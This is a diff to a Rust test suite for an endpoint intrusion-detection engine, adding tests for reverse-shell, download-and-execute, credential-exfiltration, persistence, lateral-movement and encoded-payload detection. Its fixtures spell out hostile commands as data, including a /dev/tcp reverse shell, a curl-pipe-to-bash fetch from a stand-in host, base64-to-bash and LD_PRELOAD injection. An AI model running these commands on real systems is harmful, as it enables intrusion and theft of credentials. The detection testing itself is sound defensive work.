@@ -37,6 +37,7 @@ fn temporal_cap_rule(name: &str) -> TemporalRule {
                 predicate: TemporalPredicate {
                     event_class: EventClass::ProcessExec,
                     process_any_of: Some(std::iter::once("bash".to_string()).collect()),
+                    process_starts_with: None,
                     parent_any_of: Some(std::iter::once("nginx".to_string()).collect()),
                     uid_eq: None,
                     uid_ne: None,
@@ -45,6 +46,7 @@ fn temporal_cap_rule(name: &str) -> TemporalRule {
                     file_path_any_of: None,
                     file_path_contains: None,
                     command_line_contains: None,
+                    require_file_write: false,
                 },
                 within_secs: 30,
             },
@@ -52,6 +54,7 @@ fn temporal_cap_rule(name: &str) -> TemporalRule {
                 predicate: TemporalPredicate {
                     event_class: EventClass::NetworkConnect,
                     process_any_of: None,
+                    process_starts_with: None,
                     parent_any_of: None,
                     uid_eq: None,
                     uid_ne: None,
@@ -60,6 +63,7 @@ fn temporal_cap_rule(name: &str) -> TemporalRule {
                     file_path_any_of: None,
                     file_path_contains: None,
                     command_line_contains: None,
+                    require_file_write: false,
                 },
                 within_secs: 10,
             },
@@ -110,7 +114,7 @@ fn cmdline_information_consistency_between_layers() {
         tamper_indicator: false,
     };
 
-    let features = layer5::MlFeatures::extract(&event, &signals, 0, 0, 0, 0);
+    let features = layer5::MlFeatures::extract(&event, &signals, 0, 0, 0, 0, 0);
     assert!((features.values[14] - normalized.renyi_h2).abs() < 1e-12);
     assert!((features.values[15] - normalized.compression_ratio).abs() < 1e-12);
     assert!((features.values[16] - normalized.min_entropy).abs() < 1e-12);
@@ -167,7 +171,7 @@ fn dns_entropy_feature_is_stable_and_high_for_dga_like_domains() {
         container_escape: false,
         container_privileged: false,
     };
-    let features = layer5::MlFeatures::extract(&event, &signals, 0, 0, 0, 0);
+    let features = layer5::MlFeatures::extract(&event, &signals, 0, 0, 0, 0, 0);
     let entropy_high = features.values[18];
     assert!(
         entropy_high > 0.5,
@@ -175,7 +179,7 @@ fn dns_entropy_feature_is_stable_and_high_for_dga_like_domains() {
     );
 
     event.dst_domain = Some("updates.example.org".to_string());
-    let features2 = layer5::MlFeatures::extract(&event, &signals, 0, 0, 0, 0);
+    let features2 = layer5::MlFeatures::extract(&event, &signals, 0, 0, 0, 0, 0);
     let entropy_low = features2.values[18];
     assert!(
         entropy_low < entropy_high,
@@ -269,6 +273,14 @@ fn confidence_ordering_matches_policy() {
 }
 
 #[test]
+// AC-DET-244
+fn confidence_policy_demotes_bare_kernel_integrity_to_medium() {
+    let mut s = DetectionSignals::default();
+    s.kernel_integrity = true;
+    assert_eq!(confidence_policy(&s), Confidence::Medium);
+}
+
+#[test]
 // AC-DET-001 AC-DET-002 AC-DET-008 AC-DET-009
 fn layer1_exact_verification_works() {
     let mut l1 = IocLayer1::new();
@@ -287,6 +299,31 @@ fn layer1_exact_verification_works() {
     ev.command_line = Some("curl|bash -s evil".to_string());
     let hit = l1.check_event(&ev);
     assert!(hit.matched_signatures.iter().any(|s| s == "curl|bash"));
+}
+
+#[test]
+// AC-DET-258
+fn layer1_domain_suffix_matching_catches_subdomains() {
+    let mut l1 = IocLayer1::new();
+    l1.load_domains(["evil.com".to_string()]);
+
+    assert_eq!(l1.check_domain("evil.com"), Layer1Result::ExactMatch);
+    assert_eq!(l1.check_domain("beacon.evil.com"), Layer1Result::ExactMatch);
+    assert_eq!(l1.check_domain("api.safe.com"), Layer1Result::Clean);
+}
+
+#[test]
+// AC-DET-260
+fn layer1_ipv6_normalization_matches_equivalent_variants() {
+    let mut l1 = IocLayer1::new();
+    l1.load_ips(["2001:db8::1".to_string()]);
+
+    assert_eq!(l1.check_ip("2001:db8::1"), Layer1Result::ExactMatch);
+    assert_eq!(
+        l1.check_ip("2001:0DB8:0000:0000:0000:0000:0000:0001"),
+        Layer1Result::ExactMatch
+    );
+    assert_eq!(l1.check_ip("2001:db8::2"), Layer1Result::Clean);
 }
 
 #[test]
@@ -425,6 +462,136 @@ fn temporal_engine_detects_privilege_escalation_pattern() {
 }
 
 #[test]
+// AC-DET-250
+fn temporal_engine_detects_reverse_shell_rule() {
+    let mut t = TemporalEngine::with_default_rules();
+
+    let mut e1 = event(30, EventClass::ProcessExec, "bash", "sshd", 1000);
+    e1.pid = 240;
+    e1.session_id = 240;
+    e1.command_line = Some("bash -i >& /dev/tcp/198.51.100.77/4444 0>&1".to_string());
+    assert!(t.observe(&e1).is_empty());
+
+    let mut e2 = event(35, EventClass::NetworkConnect, "bash", "sshd", 1000);
+    e2.pid = 240;
+    e2.session_id = 240;
+    e2.dst_port = Some(4444);
+
+    let hits = t.observe(&e2);
+    assert!(hits.iter().any(|h| h == "phi_reverse_shell"));
+}
+
+#[test]
+// AC-DET-251
+fn temporal_engine_detects_download_exec_then_shell() {
+    let mut t = TemporalEngine::with_default_rules();
+
+    let mut downloader = event(40, EventClass::ProcessExec, "curl", "bash", 1000);
+    downloader.pid = 241;
+    downloader.session_id = 241;
+    assert!(t.observe(&downloader).is_empty());
+
+    let mut shell = event(55, EventClass::ProcessExec, "sh", "curl", 1000);
+    shell.pid = 241;
+    shell.session_id = 241;
+
+    let hits = t.observe(&shell);
+    assert!(hits.iter().any(|h| h == "phi_download_exec"));
+}
+
+#[test]
+// AC-DET-252
+fn temporal_engine_detects_credential_exfil_rule() {
+    let mut t = TemporalEngine::with_default_rules();
+
+    let mut file_access = event(60, EventClass::FileOpen, "cat", "bash", 1000);
+    file_access.pid = 242;
+    file_access.session_id = 242;
+    file_access.file_path = Some("/etc/shadow".to_string());
+    assert!(t.observe(&file_access).is_empty());
+
+    let mut connect = event(70, EventClass::NetworkConnect, "cat", "bash", 1000);
+    connect.pid = 242;
+    connect.session_id = 242;
+    connect.dst_port = Some(9001);
+
+    let hits = t.observe(&connect);
+    assert!(hits.iter().any(|h| h == "phi_credential_exfil"));
+}
+
+#[test]
+// AC-DET-253 AC-DET-261
+fn temporal_engine_persistence_install_requires_file_write() {
+    let mut t = TemporalEngine::with_default_rules();
+
+    let mut no_write = event(80, EventClass::FileOpen, "vim", "bash", 1000);
+    no_write.pid = 243;
+    no_write.session_id = 243;
+    no_write.file_path = Some("/home/user/.bashrc".to_string());
+    no_write.file_write = false;
+    assert!(t.observe(&no_write).is_empty());
+
+    let mut exec_after_no_write = event(90, EventClass::ProcessExec, "bash", "vim", 1000);
+    exec_after_no_write.pid = 243;
+    exec_after_no_write.session_id = 243;
+    let misses = t.observe(&exec_after_no_write);
+    assert!(misses.iter().all(|h| h != "phi_persistence_install"));
+
+    let mut with_write = event(100, EventClass::FileOpen, "vim", "bash", 1000);
+    with_write.pid = 244;
+    with_write.session_id = 244;
+    with_write.file_path = Some("/home/user/.bashrc".to_string());
+    with_write.file_write = true;
+    assert!(t.observe(&with_write).is_empty());
+
+    let mut exec_after_write = event(110, EventClass::ProcessExec, "bash", "vim", 1000);
+    exec_after_write.pid = 244;
+    exec_after_write.session_id = 244;
+    let hits = t.observe(&exec_after_write);
+    assert!(hits.iter().any(|h| h == "phi_persistence_install"));
+}
+
+#[test]
+// AC-DET-254
+fn temporal_engine_detects_ssh_lateral_rule() {
+    let mut t = TemporalEngine::with_default_rules();
+
+    let mut key_access = event(120, EventClass::FileOpen, "ssh", "bash", 1000);
+    key_access.pid = 245;
+    key_access.session_id = 245;
+    key_access.file_path = Some("/home/user/.ssh/id_rsa".to_string());
+    assert!(t.observe(&key_access).is_empty());
+
+    let mut ssh_connect = event(140, EventClass::NetworkConnect, "ssh", "bash", 1000);
+    ssh_connect.pid = 245;
+    ssh_connect.session_id = 245;
+    ssh_connect.dst_port = Some(22);
+
+    let hits = t.observe(&ssh_connect);
+    assert!(hits.iter().any(|h| h == "phi_ssh_lateral"));
+}
+
+#[test]
+// AC-DET-255
+fn temporal_engine_detects_data_staging_rule() {
+    let mut t = TemporalEngine::with_default_rules();
+
+    let mut archive = event(150, EventClass::ProcessExec, "bash", "systemd", 1000);
+    archive.pid = 246;
+    archive.session_id = 246;
+    archive.command_line = Some("tar czf /tmp/stage.tgz /srv/data".to_string());
+    assert!(t.observe(&archive).is_empty());
+
+    let mut exfil = event(200, EventClass::NetworkConnect, "bash", "systemd", 1000);
+    exfil.pid = 246;
+    exfil.session_id = 246;
+    exfil.dst_port = Some(8444);
+
+    let hits = t.observe(&exfil);
+    assert!(hits.iter().any(|h| h == "phi_data_staging"));
+}
+
+#[test]
 // AC-DET-024
 fn temporal_engine_entity_isolation_prevents_cross_pid_matches() {
     let mut t = TemporalEngine::with_default_rules();
@@ -470,7 +637,9 @@ fn temporal_engine_pid_reuse_process_exec_clears_stale_pending_webshell_state() 
     let mut fresh_stage1 = event(110, EventClass::ProcessExec, "bash", "nginx", 33);
     fresh_stage1.pid = 777;
     fresh_stage1.session_id = 777;
-    assert!(t.observe(&fresh_stage1).is_empty());
+    // The fresh stage-1 may complete other multi-stage rules (e.g. phi_download_exec
+    // triggered by the earlier "python" exec) but must NOT complete phi_webshell yet.
+    assert!(t.observe(&fresh_stage1).iter().all(|h| h != "phi_webshell"));
 
     let mut fresh_stage2 = event(114, EventClass::NetworkConnect, "bash", "nginx", 33);
     fresh_stage2.pid = 777;
@@ -1301,6 +1470,37 @@ fn engine_runs_all_layers() {
 }
 
 #[test]
+// AC-DET-241
+fn detection_allowlist_short_circuits_known_good_processes() {
+    let mut d = DetectionEngine::default_with_rules();
+    d.layer1.load_hashes(["deadbeef".to_string()]);
+    d.allowlist.add_allowed_process("trusted-agent".to_string());
+
+    let mut ev = event(2, EventClass::ProcessExec, "trusted-agent", "init", 1000);
+    ev.file_hash = Some("deadbeef".to_string());
+    ev.session_id = ev.pid;
+    let out = d.process_event(&ev);
+
+    assert_eq!(out.confidence, Confidence::None);
+    assert!(!out.signals.z1_exact_ioc);
+    assert!(!out.signals.z2_temporal);
+    assert!(!out.signals.z3_anomaly_high);
+    assert!(!out.signals.z3_anomaly_med);
+    assert!(!out.signals.z4_kill_chain);
+    assert!(!out.signals.l1_prefilter_hit);
+    assert!(!out.signals.exploit_indicator);
+    assert!(!out.signals.kernel_integrity);
+    assert!(!out.signals.tamper_indicator);
+    assert!(out.temporal_hits.is_empty());
+    assert!(out.kill_chain_hits.is_empty());
+    assert!(out.exploit_indicators.is_empty());
+    assert!(out.kernel_integrity_indicators.is_empty());
+    assert!(out.tamper_indicators.is_empty());
+    assert!(out.yara_hits.is_empty());
+    assert!(out.ml_score.is_none());
+}
+
+#[test]
 // AC-DET-190 AC-DET-191 AC-DET-192 AC-DET-193
 fn ransomware_write_burst_triggers_killchain_and_ignores_sparse_writes() {
     let mut l4 = Layer4Engine::with_default_templates();
@@ -1627,6 +1827,67 @@ fn exploit_indicator_tmp_interpreter_triggers_high_confidence() {
         .iter()
         .any(|v| v == "fileless_tmp_interpreter"));
     assert_eq!(out.confidence, Confidence::High);
+}
+
+#[test]
+// AC-DET-256
+fn exploit_indicator_ld_preload_temp_path_triggers() {
+    let mut engine = DetectionEngine::default_with_rules();
+
+    let mut ev = event(23, EventClass::ProcessExec, "loader", "init", 1000);
+    ev.pid = 7310;
+    ev.ppid = 1;
+    ev.session_id = ev.pid;
+    ev.file_path = Some("/usr/bin/env".to_string());
+    ev.command_line = Some("LD_PRELOAD=/tmp/libinject.so /usr/bin/id".to_string());
+
+    let out = engine.process_event(&ev);
+    assert!(out.signals.exploit_indicator);
+    assert!(out
+        .exploit_indicators
+        .iter()
+        .any(|v| v == "fileless_ld_preload"));
+}
+
+#[test]
+// AC-DET-257
+fn exploit_indicator_pipe_exec_triggers() {
+    let mut engine = DetectionEngine::default_with_rules();
+
+    let mut ev = event(24, EventClass::ProcessExec, "curl", "init", 1000);
+    ev.pid = 7320;
+    ev.ppid = 1;
+    ev.session_id = ev.pid;
+    ev.file_path = Some("/usr/bin/curl".to_string());
+    ev.command_line = Some("curl -fsSL https://evil.example/p.sh | bash".to_string());
+
+    let out = engine.process_event(&ev);
+    assert!(out.signals.exploit_indicator);
+    assert!(out
+        .exploit_indicators
+        .iter()
+        .any(|v| v == "fileless_pipe_exec"));
+}
+
+#[test]
+// AC-DET-262
+fn exploit_indicator_base64_payload_triggers() {
+    let mut engine = DetectionEngine::default_with_rules();
+
+    let payload = "QWxhZGRpbjpPcGVuU2VzYW1l".repeat(4);
+    let mut ev = event(25, EventClass::ProcessExec, "bash", "init", 1000);
+    ev.pid = 7330;
+    ev.ppid = 1;
+    ev.session_id = ev.pid;
+    ev.file_path = Some("/bin/bash".to_string());
+    ev.command_line = Some(format!("echo {payload} | base64 -d | bash"));
+
+    let out = engine.process_event(&ev);
+    assert!(out.signals.exploit_indicator);
+    assert!(out
+        .exploit_indicators
+        .iter()
+        .any(|v| v == "encoded_payload_suspicious"));
 }
 
 #[test]
@@ -3244,6 +3505,20 @@ fn confidence_policy_is_first_match_wins() {
         kernel_integrity: false,
         tamper_indicator: false,
     };
+    assert_eq!(confidence_policy(&s), Confidence::VeryHigh);
+}
+
+#[test]
+// AC-DET-259
+fn confidence_policy_escalates_to_very_high_on_two_high_grade_signals() {
+    let mut s = DetectionSignals::default();
+    s.z2_temporal = true;
+    s.exploit_indicator = true;
+    assert_eq!(confidence_policy(&s), Confidence::VeryHigh);
+
+    let mut s = DetectionSignals::default();
+    s.tamper_indicator = true;
+    s.z4_kill_chain = true;
     assert_eq!(confidence_policy(&s), Confidence::VeryHigh);
 }
 
